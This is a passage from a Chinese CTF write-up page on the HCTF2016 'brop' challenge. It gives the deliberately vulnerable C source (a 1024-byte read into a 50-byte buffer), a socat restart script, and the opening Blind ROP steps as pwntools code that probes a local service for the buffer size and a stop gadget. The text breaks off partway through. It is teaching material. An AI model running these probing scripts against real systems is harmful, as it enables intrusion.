



<!DOCTYPE html>
<html lang="zh" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      <meta http-equiv="x-ua-compatible" content="ie=edge">
      
      
      
      
        <meta name="lang:clipboard.copy" content="复制">
      
        <meta name="lang:clipboard.copied" content="已复制">
      
        <meta name="lang:search.language" content="jp">
      
        <meta name="lang:search.pipeline.stopwords" content="True">
      
        <meta name="lang:search.pipeline.trimmer" content="True">
      
        <meta name="lang:search.result.none" content="没有找到符合条件的结果">
      
        <meta name="lang:search.result.one" content="找到 1 个符合条件的结果">
      
        <meta name="lang:search.result.other" content="# 个符合条件的结果">
      
        <meta name="lang:search.tokenizer" content="[\uff0c\u3002]+">
      
      <link rel="shortcut icon" href="../../../assets/images/favicon.png">
      <meta name="generator" content="mkdocs-0.17.2, mkdocs-material-2.6.6">
    
    
      
        <title>HCTF2016 brop - 二进制漏洞挖掘与利用</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/application.78aab2dc.css">
      
        <link rel="stylesheet" href="../../../assets/stylesheets/application-palette.6079476c.css">
      
    
    
      <script src="../../../assets/javascripts/modernizr.1aa3b519.js"></script>
    
    
      <link href="https://fonts.gstatic.com" rel="preconnect" crossorigin>
      
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Fira+Sans:300,400,400i,700|Fira+Mono">
        <style>body,input{font-family:"Fira Sans","Helvetica Neue",Helvetica,Arial,sans-serif}code,kbd,pre{font-family:"Fira Mono","Courier New",Courier,monospace}</style>
      
      <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    
    
      <link rel="stylesheet" href="../../../_static/css/extra.css">
    
    
  </head>
  
    
    
    <body dir="ltr" data-md-color-primary="white" data-md-color-accent="red">
  
    <svg class="md-svg">
      <defs>
        
        
      </defs>
    </svg>
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="drawer">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="search">
    <label class="md-overlay" data-md-component="overlay" for="drawer"></label>
    
      <a href="#_1" tabindex="1" class="md-skip">
        跳转至
      </a>
    
    
      <header class="md-header" data-md-component="header">
  <nav class="md-header-nav md-grid">
    <div class="md-flex">
      <div class="md-flex__cell md-flex__cell--shrink">
        <a href="../../.." title="二进制漏洞挖掘与利用" class="md-header-nav__button md-logo">
          
            <i class="md-icon">school</i>
          
        </a>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        <label class="md-icon md-icon--menu md-header-nav__button" for="drawer"></label>
      </div>
      <div class="md-flex__cell md-flex__cell--stretch">
        <div class="md-flex__ellipsis md-header-nav__title" data-md-component="title">
          
            
              <span class="md-header-nav__topic">
                二进制漏洞挖掘与利用
              </span>
              <span class="md-header-nav__topic">
                HCTF2016 brop
              </span>
            
          
        </div>
      </div>
      <div class="md-flex__cell md-flex__cell--shrink">
        
          
            <label class="md-icon md-icon--search md-header-nav__button" for="search"></label>
            
<div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="query" data-md-state="active">
      <label class="md-icon md-search__icon" for="search"></label>
      <button type="reset" class="md-icon md-search__icon" data-md-component="reset" tabindex="-1">
        &#xE5CD;
      </button>
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="result">
          <div class="md-search-result__meta">
            键入以开始搜索
          </div>
          <ol class="md-search-result__list"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
          
        
      </div>
      
    </div>
  </nav>
</header>
    
    <div class="md-container">
      
        
      
      
        

  

<nav class="md-tabs md-tabs--active" data-md-component="tabs">
  <div class="md-tabs__inner md-grid">
    <ul class="md-tabs__list">
      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../.." title="简介" class="md-tabs__link">
          简介
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../stackoverflow/stack_intro/" title="栈溢出" class="md-tabs__link">
          栈溢出
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞" class="md-tabs__link">
          格式化字符串漏洞
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../heap/introduction/" title="堆利用" class="md-tabs__link">
          堆利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../io_file/introduction/" title="IO_FILE 利用" class="md-tabs__link">
          IO_FILE 利用
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="../../race-condition/introduction/" title="条件竞争" class="md-tabs__link">
          条件竞争
        </a>
      
    </li>
  

      
        
  
  
    <li class="md-tabs__item">
      
        <a href="./" title="练习" class="md-tabs__link md-tabs__link--active">
          练习
        </a>
      
    </li>
  

      
    </ul>
  </div>
</nav>
      
      <main class="md-main">
        <div class="md-main__inner md-grid" data-md-component="container">
          
            
              <div class="md-sidebar md-sidebar--primary" data-md-component="navigation">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    <nav class="md-nav md-nav--primary" data-md-level="0">
  <label class="md-nav__title md-nav__title--site" for="drawer">
    <span class="md-nav__button md-logo">
      
        <i class="md-icon">school</i>
      
    </span>
    二进制漏洞挖掘与利用
  </label>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-1" type="checkbox" id="nav-1">
    
    <label class="md-nav__link" for="nav-1">
      简介
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-1">
        简介
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../.." title="简介" class="md-nav__link">
      简介
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-2" type="checkbox" id="nav-2">
    
    <label class="md-nav__link" for="nav-2">
      栈溢出
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-2">
        栈溢出
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stack_intro/" title="栈介绍" class="md-nav__link">
      栈介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/stackoverflow_basic/" title="栈溢出原理" class="md-nav__link">
      栈溢出原理
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/basic_rop/" title="基本 ROP" class="md-nav__link">
      基本 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/others/" title="花式栈溢出技巧" class="md-nav__link">
      花式栈溢出技巧
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/medium_rop/" title="中级 ROP" class="md-nav__link">
      中级 ROP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../stackoverflow/advanced_rop/" title="高级 ROP" class="md-nav__link">
      高级 ROP
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3" type="checkbox" id="nav-3">
    
    <label class="md-nav__link" for="nav-3">
      格式化字符串漏洞
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-3">
        格式化字符串漏洞
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_intro/" title="格式化字符串漏洞原理介绍" class="md-nav__link">
      格式化字符串漏洞原理介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_exploit/" title="格式化字符串漏洞利用" class="md-nav__link">
      格式化字符串漏洞利用
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_example/" title="格式化字符串漏洞例子" class="md-nav__link">
      格式化字符串漏洞例子
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/fmtstr_detect/" title="格式化字符串漏洞检测" class="md-nav__link">
      格式化字符串漏洞检测
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-3-5" type="checkbox" id="nav-3-5">
    
    <label class="md-nav__link" for="nav-3-5">
      实验
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="2">
      <label class="md-nav__title" for="nav-3-5">
        实验
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../fmtstr/example/picoctf-2014-guess/Write-up_cn/" title="picoctf-2014 guess" class="md-nav__link">
      picoctf-2014 guess
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-4" type="checkbox" id="nav-4">
    
    <label class="md-nav__link" for="nav-4">
      堆利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-4">
        堆利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/introduction/" title="堆利用简介" class="md-nav__link">
      堆利用简介
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_overview/" title="堆概述" class="md-nav__link">
      堆概述
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_structure/" title="堆相关数据结构" class="md-nav__link">
      堆相关数据结构
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heap_implementation_details/" title="深入理解堆的实现" class="md-nav__link">
      深入理解堆的实现
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/heapoverflow_basic/" title="堆溢出" class="md-nav__link">
      堆溢出
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/off_by_one/" title="堆中的 Off-By-One" class="md-nav__link">
      堆中的 Off-By-One
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/unlink/" title="Unlink" class="md-nav__link">
      Unlink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/use_after_free/" title="Use After Free" class="md-nav__link">
      Use After Free
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/fastbin_attack/" title="Fastbin Attack" class="md-nav__link">
      Fastbin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/chunk_extend_shrink/" title="Chunk Extend / Shrink" class="md-nav__link">
      Chunk Extend / Shrink
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_einherjar/" title="House Of Einherjar" class="md-nav__link">
      House Of Einherjar
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_lore/" title="House of Lore" class="md-nav__link">
      House of Lore
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_force/" title="House Of Force" class="md-nav__link">
      House Of Force
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/unsorted_bin_attack/" title="Unsorted Bin Attack" class="md-nav__link">
      Unsorted Bin Attack
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../heap/house_of_orange/" title="House of Orange" class="md-nav__link">
      House of Orange
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-5" type="checkbox" id="nav-5">
    
    <label class="md-nav__link" for="nav-5">
      IO_FILE 利用
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-5">
        IO_FILE 利用
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/introduction/" title="FILE 文件结构介绍" class="md-nav__link">
      FILE 文件结构介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fake-vtable-exploit/" title="伪造 vtable 劫持程序流程" class="md-nav__link">
      伪造 vtable 劫持程序流程
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/fsop/" title="FSOP" class="md-nav__link">
      FSOP
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../io_file/exploit-in-libc2.24/" title="新版本 libc 下 IO_FILE 的利用" class="md-nav__link">
      新版本 libc 下 IO_FILE 的利用
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      


  <li class="md-nav__item md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-6" type="checkbox" id="nav-6">
    
    <label class="md-nav__link" for="nav-6">
      条件竞争
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-6">
        条件竞争
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/introduction/" title="条件竞争介绍" class="md-nav__link">
      条件竞争介绍
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../../race-condition/problem/" title="例题" class="md-nav__link">
      例题
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
      
      
      

  


  <li class="md-nav__item md-nav__item--active md-nav__item--nested">
    
      <input class="md-toggle md-nav__toggle" data-md-toggle="nav-7" type="checkbox" id="nav-7" checked>
    
    <label class="md-nav__link" for="nav-7">
      练习
    </label>
    <nav class="md-nav" data-md-component="collapsible" data-md-level="1">
      <label class="md-nav__title" for="nav-7">
        练习
      </label>
      <ul class="md-nav__list" data-md-scrollfix>
        
        
          
          
          

  


  <li class="md-nav__item md-nav__item--active">
    
    <input class="md-toggle md-nav__toggle" data-md-toggle="toc" type="checkbox" id="toc">
    
    
      <label class="md-nav__link md-nav__link--active" for="toc">
        HCTF2016 brop
      </label>
    
    <a href="./" title="HCTF2016 brop" class="md-nav__link md-nav__link--active">
      HCTF2016 brop
    </a>
    
      
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="题目复现" class="md-nav__link">
    题目复现
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brop" title="BROP 原理及题目解析" class="md-nav__link">
    BROP 原理及题目解析
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="栈溢出" class="md-nav__link">
    栈溢出
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stop-gadget" title="stop gadget" class="md-nav__link">
    stop gadget
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#common-gadget" title="common gadget" class="md-nav__link">
    common gadget
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#putsplt" title="puts@plt" class="md-nav__link">
    puts@plt
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-dump" title="remote dump" class="md-nav__link">
    remote dump
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#putsgot" title="puts@got" class="md-nav__link">
    puts@got
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack" title="attack" class="md-nav__link">
    attack
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" title="Exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" title="参考资料" class="md-nav__link">
    参考资料
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
    
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.2_pwn_njctf2017_pingme/" title="NJCTF2017 pingme" class="md-nav__link">
      NJCTF2017 pingme
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.3_pwn_xdctf2015_pwn200/" title="XDCTF2015 pwn200" class="md-nav__link">
      XDCTF2015 pwn200
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.4_pwn_backdoorctf2017_fun_signals/" title="BackdoorCTF2017 Fun-Signals" class="md-nav__link">
      BackdoorCTF2017 Fun-Signals
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.5_pwn_grehackctf2017_beerfighter/" title="GreHackCTF2017 beerfighter" class="md-nav__link">
      GreHackCTF2017 beerfighter
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.6_pwn_defconctf2015_fuckup/" title="DefconCTF2015 fuckup" class="md-nav__link">
      DefconCTF2015 fuckup
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.7_pwn_0ctf2015_freenote/" title="0CTF2015 freenote" class="md-nav__link">
      0CTF2015 freenote
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.8_pwn_dctf2017_flex/" title="DCTF2017 Flex" class="md-nav__link">
      DCTF2017 Flex
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.9_rhme3_exploitation/" title="RHme3 Exploitation" class="md-nav__link">
      RHme3 Exploitation
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.10_0ctf2017_babyheap2017/" title="0CTF2017 BabyHeap2017" class="md-nav__link">
      0CTF2017 BabyHeap2017
    </a>
  </li>

        
          
          
          


  <li class="md-nav__item">
    <a href="../6.1.11_9447ctf2015_search_engine/" title="9447CTF2015 Search-Engine" class="md-nav__link">
      9447CTF2015 Search-Engine
    </a>
  </li>

        
      </ul>
    </nav>
  </li>

    
  </ul>
</nav>
                  </div>
                </div>
              </div>
            
            
              <div class="md-sidebar md-sidebar--secondary" data-md-component="toc">
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    
<nav class="md-nav md-nav--secondary">
  
  
  
    <label class="md-nav__title" for="toc">目录</label>
    <ul class="md-nav__list" data-md-scrollfix>
      
        <li class="md-nav__item">
  <a href="#_1" title="题目复现" class="md-nav__link">
    题目复现
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#brop" title="BROP 原理及题目解析" class="md-nav__link">
    BROP 原理及题目解析
  </a>
  
    <nav class="md-nav">
      <ul class="md-nav__list">
        
          <li class="md-nav__item">
  <a href="#_2" title="栈溢出" class="md-nav__link">
    栈溢出
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#stop-gadget" title="stop gadget" class="md-nav__link">
    stop gadget
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#common-gadget" title="common gadget" class="md-nav__link">
    common gadget
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#putsplt" title="puts@plt" class="md-nav__link">
    puts@plt
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#remote-dump" title="remote dump" class="md-nav__link">
    remote dump
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#putsgot" title="puts@got" class="md-nav__link">
    puts@got
  </a>
  
</li>
        
          <li class="md-nav__item">
  <a href="#attack" title="attack" class="md-nav__link">
    attack
  </a>
  
</li>
        
      </ul>
    </nav>
  
</li>
      
        <li class="md-nav__item">
  <a href="#exploit" title="Exploit" class="md-nav__link">
    Exploit
  </a>
  
</li>
      
        <li class="md-nav__item">
  <a href="#_3" title="参考资料" class="md-nav__link">
    参考资料
  </a>
  
</li>
      
      
      
      
      
    </ul>
  
</nav>
                  </div>
                </div>
              </div>
            
          
          <div class="md-content">
            <article class="md-content__inner md-typeset">
              
                
                
                  <h1>HCTF2016 brop</h1>
                
                <ul>
<li><a href="#题目复现">题目复现</a></li>
<li><a href="#brop-原理及题目解析">BROP 原理及题目解析</a></li>
<li><a href="#exploit">Exploit</a></li>
<li><a href="#参考资料">参考资料</a></li>
</ul>
<p><a href="../../src/writeup/6.1.1_pwn_hctf2016_brop">下载文件</a></p>
<h2 id="_1">题目复现<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
<p>出题人在 github 上开源了代码，<a href="https://github.com/zh-explorer/hctf2016-brop">出题人失踪了</a>。如下：
<div class="codehilite"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="n">i</span><span class="p">;</span>
<span class="kt">int</span> <span class="nf">check</span><span class="p">();</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>

    <span class="n">puts</span><span class="p">(</span><span class="s">&quot;WelCome my friend,Do you know password?&quot;</span><span class="p">);</span>
        <span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">check</span><span class="p">())</span> <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;Do not dump my memory&quot;</span><span class="p">);</span>
        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
            <span class="n">puts</span><span class="p">(</span><span class="s">&quot;No password, no game&quot;</span><span class="p">);</span>
        <span class="p">}</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">check</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">1024</span><span class="p">);</span>
    <span class="k">return</span> <span class="n">strcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&quot;aslvkm;asd;alsfm;aoeim;wnv;lasdnvdljasd;flk&quot;</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>
使用下面的语句编译，然后运行起来：
<div class="codehilite"><pre><span></span>$ gcc -z noexecstack -fno-stack-protector -no-pie brop.c
</pre></div>
checksec 如下：
<div class="codehilite"><pre><span></span>$ checksec -f a.out
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FORTIFY  Fortified Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   No       0               2       a.out
</pre></div>
由于 socat 在程序崩溃时会断开连接，我们写一个小脚本，让程序在崩溃后立即重启，这样就模拟出了远程环境 <code>127.0.0.1:10001</code>：
<div class="codehilite"><pre><span></span><span class="ch">#!/bin/sh</span>
<span class="k">while</span> true<span class="p">;</span> <span class="k">do</span>
        <span class="nv">num</span><span class="o">=</span><span class="sb">`</span>ps -ef <span class="p">|</span> grep <span class="s2">&quot;socat&quot;</span> <span class="p">|</span> grep -v <span class="s2">&quot;grep&quot;</span> <span class="p">|</span> wc -l<span class="sb">`</span>
        <span class="k">if</span> <span class="o">[</span> <span class="nv">$num</span> -lt <span class="m">5</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
                socat tcp4-listen:10001,reuseaddr,fork exec:./a.out <span class="p">&amp;</span>
        <span class="k">fi</span>
<span class="k">done</span>
</pre></div>
在一个单独的 shell 中运行它，这样我们就简单模拟出了比赛时的环境，即仅提供 ip 和端口。（不停地断开重连特别耗CPU，建议在服务器上跑）</p>
<h2 id="brop">BROP 原理及题目解析<a class="headerlink" href="#brop" title="Permanent link">&para;</a></h2>
<p>BROP 即 Blind ROP，需要我们在无法获得二进制文件的情况下，通过 ROP 进行远程攻击，劫持该应用程序的控制流，可用于开启了 ASLR、NX 和栈 canary 的 64-bit Linux。这一概念是是在 2014 年提出的，论文和幻灯片在参考资料中。</p>
<p>实现这一攻击有两个必要条件：
1. 目标程序存在一个栈溢出漏洞，并且我们知道怎样去触发它
2. 目标进程在崩溃后会立即重启，并且重启后进程被加载的地址不变，这样即使目标机器开启了 ASLR 也没有影响。</p>
<p>下面我们结合题目来讲一讲。</p>
<h4 id="_2">栈溢出<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h4>
<p>首先是要找到栈溢出的漏洞，老办法从 1 个字符开始，暴力枚举，直到它崩溃。
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_buffer_size</span><span class="p">():</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">):</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">i</span>
        <span class="n">buf_size</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;bad: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">buf_size</span><span class="p">)</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;buffer size: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">buf_size</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">buf_size</span>
</pre></div>
<div class="codehilite"><pre><span></span>[*] buffer size: 72
</pre></div>
要注意的是，崩溃意味着我们覆盖到了返回地址，所以缓冲区应该是发送的字符数减一，即 buf(64)+ebp(8)=72。该题并没有开启 canary，所以跳过爆破的过程。</p>
<h4 id="stop-gadget">stop gadget<a class="headerlink" href="#stop-gadget" title="Permanent link">&para;</a></h4>
<p>在寻找通用 gadget 之前，我们需要一个 stop gadget。一般情况下，当我们把返回地址覆盖后，程序有很大的几率会挂掉，因为所覆盖的地址可能并不是合法的，所以我们需要一个能够使程序正常返回的地址，称作 stop gadget，这一步至关重要。stop gadget 可能不止一个，这里我们之间返回找到的第一个好了：
<div class="codehilite"><pre><span></span><span class="k">def</span> <span class="nf">get_stop_addr</span><span class="p">(</span><span class="n">buf_size</span><span class="p">):</span>
    <span class="n">addr</span> <span class="o">=</span> <span class="mh">0x400000</span>
    <span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
        <span class="n">sleep</span><span class="p">(</span><span class="mf">0.1</span><span class="p">)</span>
        <span class="n">addr</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="n">payload</span>  <span class="o">=</span> <span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="n">buf_size</span>
        <span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="p">)</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">10001</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
            <span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
            <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&quot;stop address: 0x</span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">addr</span><span class="p">)</span>
            <span class="k">return</span> <span class="n">addr</span>
        <span class="k">except</span> <span class="ne">EOFError</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="n">p</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
